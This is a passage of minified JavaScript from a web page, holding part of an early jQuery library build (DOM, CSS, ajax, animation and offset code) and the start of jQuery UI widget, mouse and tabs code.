i=(e>0?this.clone(true):this).get();c.fn[b].apply(c(d[e]),i);f=f.concat(i)}return this.pushStack(f,a,d.selector)}}});c.extend({clean:function(a,b,d,f){b=b||s;if(typeof b.createElement==="undefined")b=b.ownerDocument||b[0]&&b[0].ownerDocument||s;for(var e=[],j=0,i;(i=a[j])!=null;j++){if(typeof i==="number")i+="";if(i){if(typeof i==="string"&&!jb.test(i))i=b.createTextNode(i);else if(typeof i==="string"){i=i.replace(Ka,Ma);var o=(La.exec(i)||["",""])[1].toLowerCase(),k=F[o]||F._default,n=k[0],r=b.createElement("div");for(r.innerHTML=k[1]+i+k[2];n--;)r=r.lastChild;if(!c.support.tbody){n=ib.test(i);o=o==="table"&&!n?r.firstChild&&r.firstChild.childNodes:k[1]==="<table>"&&!n?r.childNodes:[];for(k=o.length-1;k>=0;--k)c.nodeName(o[k],"tbody")&&!o[k].childNodes.length&&o[k].parentNode.removeChild(o[k])}!c.support.leadingWhitespace&&V.test(i)&&r.insertBefore(b.createTextNode(V.exec(i)[0]),r.firstChild);i=r.childNodes}if(i.nodeType)e.push(i);else e=c.merge(e,i)}}if(d)for(j=0;e[j];j++)if(f&&c.nodeName(e[j],"script")&&(!e[j].type||e[j].type.toLowerCase()==="text/javascript"))f.push(e[j].parentNode?e[j].parentNode.removeChild(e[j]):e[j]);else{e[j].nodeType===1&&e.splice.apply(e,[j+1,0].concat(c.makeArray(e[j].getElementsByTagName("script"))));d.appendChild(e[j])}return e},cleanData:function(a){for(var b,d,f=c.cache,e=c.event.special,j=c.support.deleteExpando,i=0,o;(o=a[i])!=null;i++)if(d=o[c.expando]){b=f[d];if(b.events)for(var k in b.events)e[k]?c.event.remove(o,k):Ca(o,k,b.handle);if(j)delete o[c.expando];else o.removeAttribute&&o.removeAttribute(c.expando);delete f[d]}}});var kb=/z-?index|font-?weight|opacity|zoom|line-?height/i,Na=/alpha\([^)]*\)/,Oa=/opacity=([^)]*)/,ha=/float/i,ia=/-([a-z])/ig,lb=/([A-Z])/g,mb=/^-?\d+(?:px)?$/i,nb=/^-?\d/,ob={position:"absolute",visibility:"hidden",display:"block"},pb=["Left","Right"],qb=["Top","Bottom"],rb=s.defaultView&&s.defaultView.getComputedStyle,Pa=c.support.cssFloat?"cssFloat":"styleFloat",ja=function(a,b){return b.toUpperCase()};c.fn.css=function(a,b){return X(this,a,b,true,function(d,f,e){if(e===w)return c.curCSS(d,f);if(typeof e==="number"&&!kb.test(f))e+="px";c.style(d,f,e)})};c.extend({style:function(a,b,d){if(!a||a.nodeType===3||a.nodeType===8)return w;if((b==="width"||b==="height")&&parseFloat(d)<0)d=w;var f=a.style||a,e=d!==w;if(!c.support.opacity&&b==="opacity"){if(e){f.zoom=1;b=parseInt(d,10)+""==="NaN"?"":"alpha(opacity="+d*100+")";a=f.filter||c.curCSS(a,"filter")||"";f.filter=Na.test(a)?a.replace(Na,b):b}return f.filter&&f.filter.indexOf("opacity=")>=0?parseFloat(Oa.exec(f.filter)[1])/100+"":""}if(ha.test(b))b=Pa;b=b.replace(ia,ja);if(e)f[b]=d;return f[b]},css:function(a,b,d,f){if(b==="width"||b==="height"){var e,j=b==="width"?pb:qb;function i(){e=b==="width"?a.offsetWidth:a.offsetHeight;f!=="border"&&c.each(j,function(){f||(e-=parseFloat(c.curCSS(a,"padding"+this,true))||0);if(f==="margin")e+=parseFloat(c.curCSS(a,"margin"+this,true))||0;else e-=parseFloat(c.curCSS(a,"border"+this+"Width",true))||0})}a.offsetWidth!==0?i():c.swap(a,ob,i);return Math.max(0,Math.round(e))}return c.curCSS(a,b,d)},curCSS:function(a,b,d){var f,e=a.style;if(!c.support.opacity&&b==="opacity"&&a.currentStyle){f=Oa.test(a.currentStyle.filter||"")?parseFloat(RegExp.$1)/100+"":"";return f===""?"1":f}if(ha.test(b))b=Pa;if(!d&&e&&e[b])f=e[b];else if(rb){if(ha.test(b))b="float";b=b.replace(lb,"-$1").toLowerCase();e=a.ownerDocument.defaultView;if(!e)return null;if(a=e.getComputedStyle(a,null))f=a.getPropertyValue(b);if(b==="opacity"&&f==="")f="1"}else if(a.currentStyle){d=b.replace(ia,ja);f=a.currentStyle[b]||a.currentStyle[d];if(!mb.test(f)&&nb.test(f)){b=e.left;var j=a.runtimeStyle.left;a.runtimeStyle.left=a.currentStyle.left;e.left=d==="fontSize"?"1em":f||0;f=e.pixelLeft+"px";e.left=b;a.runtimeStyle.left=j}}return f},swap:function(a,b,d){var f={};for(var e in b){f[e]=a.style[e];a.style[e]=b[e]}d.call(a);for(e in b)a.style[e]=f[e]}});if(c.expr&&c.expr.filters){c.expr.filters.hidden=function(a){var b=a.offsetWidth,d=a.offsetHeight,f=a.nodeName.toLowerCase()==="tr";return b===0&&d===0&&!f?true:b>0&&d>0&&!f?false:c.curCSS(a,"display")==="none"};c.expr.filters.visible=function(a){return!c.expr.filters.hidden(a)}}var sb=J(),tb=/<script(.|\s)*?\/script>/gi,ub=/select|textarea/i,vb=/color|date|datetime|email|hidden|month|number|password|range|search|tel|text|time|url|week/i,N=/=\?(&|$)/,ka=/\?/,wb=/(\?|&)_=.*?(&|$)/,xb=/^(\w+:)?\/\/([^\/?#]+)/,yb=/%20/g,zb=c.fn.load;c.fn.extend({load:function(a,b,d){if(typeof a!=="string")return zb.call(this,a);else if(!this.length)return this;var f=a.indexOf(" ");if(f>=0){var e=a.slice(f,a.length);a=a.slice(0,f)}f="GET";if(b)if(c.isFunction(b)){d=b;b=null}else if(typeof b==="object"){b=c.param(b,c.ajaxSettings.traditional);f="POST"}var j=this;c.ajax({url:a,type:f,dataType:"html",data:b,complete:function(i,o){if(o==="success"||o==="notmodified")j.html(e?c("<div />").append(i.responseText.replace(tb,"")).find(e):i.responseText);d&&j.each(d,[i.responseText,o,i])}});return this},serialize:function(){return c.param(this.serializeArray())},serializeArray:function(){return this.map(function(){return this.elements?c.makeArray(this.elements):this}).filter(function(){return this.name&&!this.disabled&&(this.checked||ub.test(this.nodeName)||vb.test(this.type))}).map(function(a,b){a=c(this).val();return a==null?null:c.isArray(a)?c.map(a,function(d){return{name:b.name,value:d}}):{name:b.name,value:a}}).get()}});c.each("ajaxStart ajaxStop ajaxComplete ajaxError ajaxSuccess ajaxSend".split(" "),function(a,b){c.fn[b]=function(d){return this.bind(b,d)}});c.extend({get:function(a,b,d,f){if(c.isFunction(b)){f=f||d;d=b;b=null}return c.ajax({type:"GET",url:a,data:b,success:d,dataType:f})},getScript:function(a,b){return c.get(a,null,b,"script")},getJSON:function(a,b,d){return c.get(a,b,d,"json")},post:function(a,b,d,f){if(c.isFunction(b)){f=f||d;d=b;b={}}return c.ajax({type:"POST",url:a,data:b,success:d,dataType:f})},ajaxSetup:function(a){c.extend(c.ajaxSettings,a)},ajaxSettings:{url:location.href,global:true,type:"GET",contentType:"application/x-www-form-urlencoded",processData:true,async:true,xhr:A.XMLHttpRequest&&(A.location.protocol!=="file:"||!A.ActiveXObject)?function(){return new A.XMLHttpRequest}:function(){try{return new A.ActiveXObject("Microsoft.XMLHTTP")}catch(a){}},accepts:{xml:"application/xml, text/xml",html:"text/html",script:"text/javascript, application/javascript",json:"application/json, text/javascript",text:"text/plain",_default:"*/*"}},lastModified:{},etag:{},ajax:function(a){function b(){e.success&&e.success.call(k,o,i,x);e.global&&f("ajaxSuccess",[x,e])}function d(){e.complete&&e.complete.call(k,x,i);e.global&&f("ajaxComplete",[x,e]);e.global&&!--c.active&&c.event.trigger("ajaxStop")}function f(q,p){(e.context?c(e.context):c.event).trigger(q,p)}var e=c.extend(true,{},c.ajaxSettings,a),j,i,o,k=a&&a.context||e,n=e.type.toUpperCase();if(e.data&&e.processData&&typeof e.data!=="string")e.data=c.param(e.data,e.traditional);if(e.dataType==="jsonp"){if(n==="GET")N.test(e.url)||(e.url+=(ka.test(e.url)?"&":"?")+(e.jsonp||"callback")+"=?");else if(!e.data||!N.test(e.data))e.data=(e.data?e.data+"&":"")+(e.jsonp||"callback")+"=?";e.dataType="json"}if(e.dataType==="json"&&(e.data&&N.test(e.data)||N.test(e.url))){j=e.jsonpCallback||"jsonp"+sb++;if(e.data)e.data=(e.data+"").replace(N,"="+j+"$1");e.url=e.url.replace(N,"="+j+"$1");e.dataType="script";A[j]=A[j]||function(q){o=q;b();d();A[j]=w;try{delete A[j]}catch(p){}z&&z.removeChild(C)}}if(e.dataType==="script"&&e.cache===null)e.cache=false;if(e.cache===false&&n==="GET"){var r=J(),u=e.url.replace(wb,"$1_="+r+"$2");e.url=u+(u===e.url?(ka.test(e.url)?"&":"?")+"_="+r:"")}if(e.data&&n==="GET")e.url+=(ka.test(e.url)?"&":"?")+e.data;e.global&&!c.active++&&c.event.trigger("ajaxStart");r=(r=xb.exec(e.url))&&(r[1]&&r[1]!==location.protocol||r[2]!==location.host);if(e.dataType==="script"&&n==="GET"&&r){var z=s.getElementsByTagName("head")[0]||s.documentElement,C=s.createElement("script");C.src=e.url;if(e.scriptCharset)C.charset=e.scriptCharset;if(!j){var B=false;C.onload=C.onreadystatechange=function(){if(!B&&(!this.readyState||this.readyState==="loaded"||this.readyState==="complete")){B=true;b();d();C.onload=C.onreadystatechange=null;z&&C.parentNode&&z.removeChild(C)}}}z.insertBefore(C,z.firstChild);return w}var E=false,x=e.xhr();if(x){e.username?x.open(n,e.url,e.async,e.username,e.password):x.open(n,e.url,e.async);try{if(e.data||a&&a.contentType)x.setRequestHeader("Content-Type",e.contentType);if(e.ifModified){c.lastModified[e.url]&&x.setRequestHeader("If-Modified-Since",c.lastModified[e.url]);c.etag[e.url]&&x.setRequestHeader("If-None-Match",c.etag[e.url])}r||x.setRequestHeader("X-Requested-With","XMLHttpRequest");x.setRequestHeader("Accept",e.dataType&&e.accepts[e.dataType]?e.accepts[e.dataType]+", */*":e.accepts._default)}catch(ga){}if(e.beforeSend&&e.beforeSend.call(k,x,e)===false){e.global&&!--c.active&&c.event.trigger("ajaxStop");x.abort();return false}e.global&&f("ajaxSend",[x,e]);var g=x.onreadystatechange=function(q){if(!x||x.readyState===0||q==="abort"){E||d();E=true;if(x)x.onreadystatechange=c.noop}else if(!E&&x&&(x.readyState===4||q==="timeout")){E=true;x.onreadystatechange=c.noop;i=q==="timeout"?"timeout":!c.httpSuccess(x)?"error":e.ifModified&&c.httpNotModified(x,e.url)?"notmodified":"success";var p;if(i==="success")try{o=c.httpData(x,e.dataType,e)}catch(v){i="parsererror";p=v}if(i==="success"||i==="notmodified")j||b();else c.handleError(e,x,i,p);d();q==="timeout"&&x.abort();if(e.async)x=null}};try{var h=x.abort;x.abort=function(){x&&h.call(x);g("abort")}}catch(l){}e.async&&e.timeout>0&&setTimeout(function(){x&&!E&&g("timeout")},e.timeout);try{x.send(n==="POST"||n==="PUT"||n==="DELETE"?e.data:null)}catch(m){c.handleError(e,x,null,m);d()}e.async||g();return x}},handleError:function(a,b,d,f){if(a.error)a.error.call(a.context||a,b,d,f);if(a.global)(a.context?c(a.context):c.event).trigger("ajaxError",[b,a,f])},active:0,httpSuccess:function(a){try{return!a.status&&location.protocol==="file:"||a.status>=200&&a.status<300||a.status===304||a.status===1223||a.status===0}catch(b){}return false},httpNotModified:function(a,b){var d=a.getResponseHeader("Last-Modified"),f=a.getResponseHeader("Etag");if(d)c.lastModified[b]=d;if(f)c.etag[b]=f;return a.status===304||a.status===0},httpData:function(a,b,d){var f=a.getResponseHeader("content-type")||"",e=b==="xml"||!b&&f.indexOf("xml")>=0;a=e?a.responseXML:a.responseText;e&&a.documentElement.nodeName==="parsererror"&&c.error("parsererror");if(d&&d.dataFilter)a=d.dataFilter(a,b);if(typeof a==="string")if(b==="json"||!b&&f.indexOf("json")>=0)a=c.parseJSON(a);else if(b==="script"||!b&&f.indexOf("javascript")>=0)c.globalEval(a);return a},param:function(a,b){function d(i,o){if(c.isArray(o))c.each(o,function(k,n){b||/\[\]$/.test(i)?f(i,n):d(i+"["+(typeof n==="object"||c.isArray(n)?k:"")+"]",n)});else!b&&o!=null&&typeof o==="object"?c.each(o,function(k,n){d(i+"["+k+"]",n)}):f(i,o)}function f(i,o){o=c.isFunction(o)?o():o;e[e.length]=encodeURIComponent(i)+"="+encodeURIComponent(o)}var e=[];if(b===w)b=c.ajaxSettings.traditional;if(c.isArray(a)||a.jquery)c.each(a,function(){f(this.name,this.value)});else for(var j in a)d(j,a[j]);return e.join("&").replace(yb,"+")}});var la={},Ab=/toggle|show|hide/,Bb=/^([+-]=)?([\d+-.]+)(.*)$/,W,va=[["height","marginTop","marginBottom","paddingTop","paddingBottom"],["width","marginLeft","marginRight","paddingLeft","paddingRight"],["opacity"]];c.fn.extend({show:function(a,b){if(a||a===0)return this.animate(K("show",3),a,b);else{a=0;for(b=this.length;a<b;a++){var d=c.data(this[a],"olddisplay");this[a].style.display=d||"";if(c.css(this[a],"display")==="none"){d=this[a].nodeName;var f;if(la[d])f=la[d];else{var e=c("<"+d+" />").appendTo("body");f=e.css("display");if(f==="none")f="block";e.remove();la[d]=f}c.data(this[a],"olddisplay",f)}}a=0;for(b=this.length;a<b;a++)this[a].style.display=c.data(this[a],"olddisplay")||"";return this}},hide:function(a,b){if(a||a===0)return this.animate(K("hide",3),a,b);else{a=0;for(b=this.length;a<b;a++){var d=c.data(this[a],"olddisplay");!d&&d!=="none"&&c.data(this[a],"olddisplay",c.css(this[a],"display"))}a=0;for(b=this.length;a<b;a++)this[a].style.display="none";return this}},_toggle:c.fn.toggle,toggle:function(a,b){var d=typeof a==="boolean";if(c.isFunction(a)&&c.isFunction(b))this._toggle.apply(this,arguments);else a==null||d?this.each(function(){var f=d?a:c(this).is(":hidden");c(this)[f?"show":"hide"]()}):this.animate(K("toggle",3),a,b);return this},fadeTo:function(a,b,d){return this.filter(":hidden").css("opacity",0).show().end().animate({opacity:b},a,d)},animate:function(a,b,d,f){var e=c.speed(b,d,f);if(c.isEmptyObject(a))return this.each(e.complete);return this[e.queue===false?"each":"queue"](function(){var j=c.extend({},e),i,o=this.nodeType===1&&c(this).is(":hidden"),k=this;for(i in a){var n=i.replace(ia,ja);if(i!==n){a[n]=a[i];delete a[i];i=n}if(a[i]==="hide"&&o||a[i]==="show"&&!o)return j.complete.call(this);if((i==="height"||i==="width")&&this.style){j.display=c.css(this,"display");j.overflow=this.style.overflow}if(c.isArray(a[i])){(j.specialEasing=j.specialEasing||{})[i]=a[i][1];a[i]=a[i][0]}}if(j.overflow!=null)this.style.overflow="hidden";j.curAnim=c.extend({},a);c.each(a,function(r,u){var z=new c.fx(k,j,r);if(Ab.test(u))z[u==="toggle"?o?"show":"hide":u](a);else{var C=Bb.exec(u),B=z.cur(true)||0;if(C){u=parseFloat(C[2]);var E=C[3]||"px";if(E!=="px"){k.style[r]=(u||1)+E;B=(u||1)/z.cur(true)*B;k.style[r]=B+E}if(C[1])u=(C[1]==="-="?-1:1)*u+B;z.custom(B,u,E)}else z.custom(B,u,"")}});return true})},stop:function(a,b){var d=c.timers;a&&this.queue([]);this.each(function(){for(var f=d.length-1;f>=0;f--)if(d[f].elem===this){b&&d[f](true);d.splice(f,1)}});b||this.dequeue();return this}});c.each({slideDown:K("show",1),slideUp:K("hide",1),slideToggle:K("toggle",1),fadeIn:{opacity:"show"},fadeOut:{opacity:"hide"}},function(a,b){c.fn[a]=function(d,f){return this.animate(b,d,f)}});c.extend({speed:function(a,b,d){var f=a&&typeof a==="object"?a:{complete:d||!d&&b||c.isFunction(a)&&a,duration:a,easing:d&&b||b&&!c.isFunction(b)&&b};f.duration=c.fx.off?0:typeof f.duration==="number"?f.duration:c.fx.speeds[f.duration]||c.fx.speeds._default;f.old=f.complete;f.complete=function(){f.queue!==false&&c(this).dequeue();c.isFunction(f.old)&&f.old.call(this)};return f},easing:{linear:function(a,b,d,f){return d+f*a},swing:function(a,b,d,f){return(-Math.cos(a*Math.PI)/2+0.5)*f+d}},timers:[],fx:function(a,b,d){this.options=b;this.elem=a;this.prop=d;if(!b.orig)b.orig={}}});c.fx.prototype={update:function(){this.options.step&&this.options.step.call(this.elem,this.now,this);(c.fx.step[this.prop]||c.fx.step._default)(this);if((this.prop==="height"||this.prop==="width")&&this.elem.style)this.elem.style.display="block"},cur:function(a){if(this.elem[this.prop]!=null&&(!this.elem.style||this.elem.style[this.prop]==null))return this.elem[this.prop];return(a=parseFloat(c.css(this.elem,this.prop,a)))&&a>-10000?a:parseFloat(c.curCSS(this.elem,this.prop))||0},custom:function(a,b,d){function f(j){return e.step(j)}this.startTime=J();this.start=a;this.end=b;this.unit=d||this.unit||"px";this.now=this.start;this.pos=this.state=0;var e=this;f.elem=this.elem;if(f()&&c.timers.push(f)&&!W)W=setInterval(c.fx.tick,13)},show:function(){this.options.orig[this.prop]=c.style(this.elem,this.prop);this.options.show=true;this.custom(this.prop==="width"||this.prop==="height"?1:0,this.cur());c(this.elem).show()},hide:function(){this.options.orig[this.prop]=c.style(this.elem,this.prop);this.options.hide=true;this.custom(this.cur(),0)},step:function(a){var b=J(),d=true;if(a||b>=this.options.duration+this.startTime){this.now=this.end;this.pos=this.state=1;this.update();this.options.curAnim[this.prop]=true;for(var f in this.options.curAnim)if(this.options.curAnim[f]!==true)d=false;if(d){if(this.options.display!=null){this.elem.style.overflow=this.options.overflow;a=c.data(this.elem,"olddisplay");this.elem.style.display=a?a:this.options.display;if(c.css(this.elem,"display")==="none")this.elem.style.display="block"}this.options.hide&&c(this.elem).hide();if(this.options.hide||this.options.show)for(var e in this.options.curAnim)c.style(this.elem,e,this.options.orig[e]);this.options.complete.call(this.elem)}return false}else{e=b-this.startTime;this.state=e/this.options.duration;a=this.options.easing||(c.easing.swing?"swing":"linear");this.pos=c.easing[this.options.specialEasing&&this.options.specialEasing[this.prop]||a](this.state,e,0,1,this.options.duration);this.now=this.start+(this.end-this.start)*this.pos;this.update()}return true}};c.extend(c.fx,{tick:function(){for(var a=c.timers,b=0;b<a.length;b++)a[b]()||a.splice(b--,1);a.length||c.fx.stop()},stop:function(){clearInterval(W);W=null},speeds:{slow:600,fast:200,_default:400},step:{opacity:function(a){c.style(a.elem,"opacity",a.now)},_default:function(a){if(a.elem.style&&a.elem.style[a.prop]!=null)a.elem.style[a.prop]=(a.prop==="width"||a.prop==="height"?Math.max(0,a.now):a.now)+a.unit;else a.elem[a.prop]=a.now}}});if(c.expr&&c.expr.filters)c.expr.filters.animated=function(a){return c.grep(c.timers,function(b){return a===b.elem}).length};c.fn.offset="getBoundingClientRect"in s.documentElement?function(a){var b=this[0];if(a)return this.each(function(e){c.offset.setOffset(this,a,e)});if(!b||!b.ownerDocument)return null;if(b===b.ownerDocument.body)return c.offset.bodyOffset(b);var d=b.getBoundingClientRect(),f=b.ownerDocument;b=f.body;f=f.documentElement;return{top:d.top+(self.pageYOffset||c.support.boxModel&&f.scrollTop||b.scrollTop)-(f.clientTop||b.clientTop||0),left:d.left+(self.pageXOffset||c.support.boxModel&&f.scrollLeft||b.scrollLeft)-(f.clientLeft||b.clientLeft||0)}}:function(a){var b=this[0];if(a)return this.each(function(r){c.offset.setOffset(this,a,r)});if(!b||!b.ownerDocument)return null;if(b===b.ownerDocument.body)return c.offset.bodyOffset(b);c.offset.initialize();var d=b.offsetParent,f=b,e=b.ownerDocument,j,i=e.documentElement,o=e.body;f=(e=e.defaultView)?e.getComputedStyle(b,null):b.currentStyle;for(var k=b.offsetTop,n=b.offsetLeft;(b=b.parentNode)&&b!==o&&b!==i;){if(c.offset.supportsFixedPosition&&f.position==="fixed")break;j=e?e.getComputedStyle(b,null):b.currentStyle;k-=b.scrollTop;n-=b.scrollLeft;if(b===d){k+=b.offsetTop;n+=b.offsetLeft;if(c.offset.doesNotAddBorder&&!(c.offset.doesAddBorderForTableAndCells&&/^t(able|d|h)$/i.test(b.nodeName))){k+=parseFloat(j.borderTopWidth)||0;n+=parseFloat(j.borderLeftWidth)||0}f=d;d=b.offsetParent}if(c.offset.subtractsBorderForOverflowNotVisible&&j.overflow!=="visible"){k+=parseFloat(j.borderTopWidth)||0;n+=parseFloat(j.borderLeftWidth)||0}f=j}if(f.position==="relative"||f.position==="static"){k+=o.offsetTop;n+=o.offsetLeft}if(c.offset.supportsFixedPosition&&f.position==="fixed"){k+=Math.max(i.scrollTop,o.scrollTop);n+=Math.max(i.scrollLeft,o.scrollLeft)}return{top:k,left:n}};c.offset={initialize:function(){var a=s.body,b=s.createElement("div"),d,f,e,j=parseFloat(c.curCSS(a,"marginTop",true))||0;c.extend(b.style,{position:"absolute",top:0,left:0,margin:0,border:0,width:"1px",height:"1px",visibility:"hidden"});b.innerHTML="<div style='position:absolute;top:0;left:0;margin:0;border:5px solid #000;padding:0;width:1px;height:1px;'><div></div></div><table style='position:absolute;top:0;left:0;margin:0;border:5px solid #000;padding:0;width:1px;height:1px;' cellpadding='0' cellspacing='0'><tr><td></td></tr></table>";a.insertBefore(b,a.firstChild);d=b.firstChild;f=d.firstChild;e=d.nextSibling.firstChild.firstChild;this.doesNotAddBorder=f.offsetTop!==5;this.doesAddBorderForTableAndCells=e.offsetTop===5;f.style.position="fixed";f.style.top="20px";this.supportsFixedPosition=f.offsetTop===20||f.offsetTop===15;f.style.position=f.style.top="";d.style.overflow="hidden";d.style.position="relative";this.subtractsBorderForOverflowNotVisible=f.offsetTop===-5;this.doesNotIncludeMarginInBodyOffset=a.offsetTop!==j;a.removeChild(b);c.offset.initialize=c.noop},bodyOffset:function(a){var b=a.offsetTop,d=a.offsetLeft;c.offset.initialize();if(c.offset.doesNotIncludeMarginInBodyOffset){b+=parseFloat(c.curCSS(a,"marginTop",true))||0;d+=parseFloat(c.curCSS(a,"marginLeft",true))||0}return{top:b,left:d}},setOffset:function(a,b,d){if(/static/.test(c.curCSS(a,"position")))a.style.position="relative";var f=c(a),e=f.offset(),j=parseInt(c.curCSS(a,"top",true),10)||0,i=parseInt(c.curCSS(a,"left",true),10)||0;if(c.isFunction(b))b=b.call(a,d,e);d={top:b.top-e.top+j,left:b.left-e.left+i};"using"in b?b.using.call(a,d):f.css(d)}};c.fn.extend({position:function(){if(!this[0])return null;var a=this[0],b=this.offsetParent(),d=this.offset(),f=/^body|html$/i.test(b[0].nodeName)?{top:0,left:0}:b.offset();d.top-=parseFloat(c.curCSS(a,"marginTop",true))||0;d.left-=parseFloat(c.curCSS(a,"marginLeft",true))||0;f.top+=parseFloat(c.curCSS(b[0],"borderTopWidth",true))||0;f.left+=parseFloat(c.curCSS(b[0],"borderLeftWidth",true))||0;return{top:d.top-
f.top,left:d.left-f.left}},offsetParent:function(){return this.map(function(){for(var a=this.offsetParent||s.body;a&&!/^body|html$/i.test(a.nodeName)&&c.css(a,"position")==="static";)a=a.offsetParent;return a})}});c.each(["Left","Top"],function(a,b){var d="scroll"+b;c.fn[d]=function(f){var e=this[0],j;if(!e)return null;if(f!==w)return this.each(function(){if(j=wa(this))j.scrollTo(!a?f:c(j).scrollLeft(),a?f:c(j).scrollTop());else this[d]=f});else return(j=wa(e))?"pageXOffset"in j?j[a?"pageYOffset":"pageXOffset"]:c.support.boxModel&&j.document.documentElement[d]||j.document.body[d]:e[d]}});c.each(["Height","Width"],function(a,b){var d=b.toLowerCase();c.fn["inner"+b]=function(){return this[0]?c.css(this[0],d,false,"padding"):null};c.fn["outer"+b]=function(f){return this[0]?c.css(this[0],d,false,f?"margin":"border"):null};c.fn[d]=function(f){var e=this[0];if(!e)return f==null?null:this;if(c.isFunction(f))return this.each(function(j){var i=c(this);i[d](f.call(this,j,i[d]()))});return"scrollTo"in
e&&e.document?e.document.compatMode==="CSS1Compat"&&e.document.documentElement["client"+b]||e.document.body["client"+b]:e.nodeType===9?Math.max(e.documentElement["client"+b],e.body["scroll"+b],e.documentElement["scroll"+b],e.body["offset"+b],e.documentElement["offset"+b]):f===w?c.css(e,d):this.css(d,typeof f==="string"?f:f+"px")}});A.jQuery=A.$=c})(window);</script>
    <script type="text/javascript">;(function($){$.ui={plugin:{add:function(module,option,set){var proto=$.ui[module].prototype;for(var i in set){proto.plugins[i]=proto.plugins[i]||[];proto.plugins[i].push([option,set[i]]);}},call:function(instance,name,args){var set=instance.plugins[name];if(!set){return;}
for(var i=0;i<set.length;i++){if(instance.options[set[i][0]]){set[i][1].apply(instance.element,args);}}}},cssCache:{},css:function(name){if($.ui.cssCache[name]){return $.ui.cssCache[name];}
var tmp=$('<div class="ui-gen">').addClass(name).css({position:'absolute',top:'-5000px',left:'-5000px',display:'block'}).appendTo('body');$.ui.cssCache[name]=!!((!(/auto|default/).test(tmp.css('cursor'))||(/^[1-9]/).test(tmp.css('height'))||(/^[1-9]/).test(tmp.css('width'))||!(/none/).test(tmp.css('backgroundImage'))||!(/transparent|rgba\(0, 0, 0, 0\)/).test(tmp.css('backgroundColor'))));try{$('body').get(0).removeChild(tmp.get(0));}catch(e){}
return $.ui.cssCache[name];},disableSelection:function(el){$(el).attr('unselectable','on').css('MozUserSelect','none');},enableSelection:function(el){$(el).attr('unselectable','off').css('MozUserSelect','');},hasScroll:function(e,a){var scroll=/top/.test(a||"top")?'scrollTop':'scrollLeft',has=false;if(e[scroll]>0)return true;e[scroll]=1;has=e[scroll]>0?true:false;e[scroll]=0;return has;}};var _remove=$.fn.remove;$.fn.remove=function(){$("*",this).add(this).triggerHandler("remove");return _remove.apply(this,arguments);};function getter(namespace,plugin,method){var methods=$[namespace][plugin].getter||[];methods=(typeof methods=="string"?methods.split(/,?\s+/):methods);return($.inArray(method,methods)!=-1);}
$.widget=function(name,prototype){var namespace=name.split(".")[0];name=name.split(".")[1];$.fn[name]=function(options){var isMethodCall=(typeof options=='string'),args=Array.prototype.slice.call(arguments,1);if(isMethodCall&&getter(namespace,name,options)){var instance=$.data(this[0],name);return(instance?instance[options].apply(instance,args):undefined);}
return this.each(function(){var instance=$.data(this,name);if(isMethodCall&&instance&&$.isFunction(instance[options])){instance[options].apply(instance,args);}else if(!isMethodCall){$.data(this,name,new $[namespace][name](this,options));}});};$[namespace][name]=function(element,options){var self=this;this.widgetName=name;this.widgetBaseClass=namespace+'-'+name;this.options=$.extend({},$.widget.defaults,$[namespace][name].defaults,options);this.element=$(element).bind('setData.'+name,function(e,key,value){return self.setData(key,value);}).bind('getData.'+name,function(e,key){return self.getData(key);}).bind('remove',function(){return self.destroy();});this.init();};$[namespace][name].prototype=$.extend({},$.widget.prototype,prototype);};$.widget.prototype={init:function(){},destroy:function(){this.element.removeData(this.widgetName);},getData:function(key){return this.options[key];},setData:function(key,value){this.options[key]=value;if(key=='disabled'){this.element[value?'addClass':'removeClass'](this.widgetBaseClass+'-disabled');}},enable:function(){this.setData('disabled',false);},disable:function(){this.setData('disabled',true);}};$.widget.defaults={disabled:false};$.ui.mouse={mouseInit:function(){var self=this;this.element.bind('mousedown.'+this.widgetName,function(e){return self.mouseDown(e);});if($.browser.msie){this._mouseUnselectable=this.element.attr('unselectable');this.element.attr('unselectable','on');}
this.started=false;},mouseDestroy:function(){this.element.unbind('.'+this.widgetName);($.browser.msie&&this.element.attr('unselectable',this._mouseUnselectable));},mouseDown:function(e){(this._mouseStarted&&this.mouseUp(e));this._mouseDownEvent=e;var self=this,btnIsLeft=(e.which==1),elIsCancel=(typeof this.options.cancel=="string"?$(e.target).parents().add(e.target).filter(this.options.cancel).length:false);if(!btnIsLeft||elIsCancel||!this.mouseCapture(e)){return true;}
this._mouseDelayMet=!this.options.delay;if(!this._mouseDelayMet){this._mouseDelayTimer=setTimeout(function(){self._mouseDelayMet=true;},this.options.delay);}
if(this.mouseDistanceMet(e)&&this.mouseDelayMet(e)){this._mouseStarted=(this.mouseStart(e)!==false);if(!this._mouseStarted){e.preventDefault();return true;}}
this._mouseMoveDelegate=function(e){return self.mouseMove(e);};this._mouseUpDelegate=function(e){return self.mouseUp(e);};$(document).bind('mousemove.'+this.widgetName,this._mouseMoveDelegate).bind('mouseup.'+this.widgetName,this._mouseUpDelegate);return false;},mouseMove:function(e){if($.browser.msie&&!e.button){return this.mouseUp(e);}
if(this._mouseStarted){this.mouseDrag(e);return false;}
if(this.mouseDistanceMet(e)&&this.mouseDelayMet(e)){this._mouseStarted=(this.mouseStart(this._mouseDownEvent,e)!==false);(this._mouseStarted?this.mouseDrag(e):this.mouseUp(e));}
return!this._mouseStarted;},mouseUp:function(e){$(document).unbind('mousemove.'+this.widgetName,this._mouseMoveDelegate).unbind('mouseup.'+this.widgetName,this._mouseUpDelegate);if(this._mouseStarted){this._mouseStarted=false;this.mouseStop(e);}
return false;},mouseDistanceMet:function(e){return(Math.max(Math.abs(this._mouseDownEvent.pageX-e.pageX),Math.abs(this._mouseDownEvent.pageY-e.pageY))>=this.options.distance);},mouseDelayMet:function(e){return this._mouseDelayMet;},mouseStart:function(e){},mouseDrag:function(e){},mouseStop:function(e){},mouseCapture:function(e){return true;}};$.ui.mouse.defaults={cancel:null,distance:1,delay:0};})(jQuery);(function($){$.widget("ui.tabs",{init:function(){this.options.event+='.tabs';this.tabify(true);},setData:function(key,value){if((/^selected/).test(key))
this.select(value);else{this.options[key]=value;this.tabify();}},length:function(){return this.$tabs.length;},tabId:function(a){return a.title&&a.title.replace(/\s/g,'_').replace(/[^A-Za-z0-9\-_:\.]/g,'')||this.options.idPrefix+$.data(a);},ui:function(tab,panel){return{options:this.options,tab:tab,panel:panel,index:this.$tabs.index(tab)};},tabify:function(init){this.$lis=$('li:has(a[href])',this.element);this.$tabs=this.$lis.map(function(){return $('a',this)[0];});this.$panels=$([]);var self=this,o=this.options;this.$tabs.each(function(i,a){if(a.hash&&a.hash.replace('#',''))
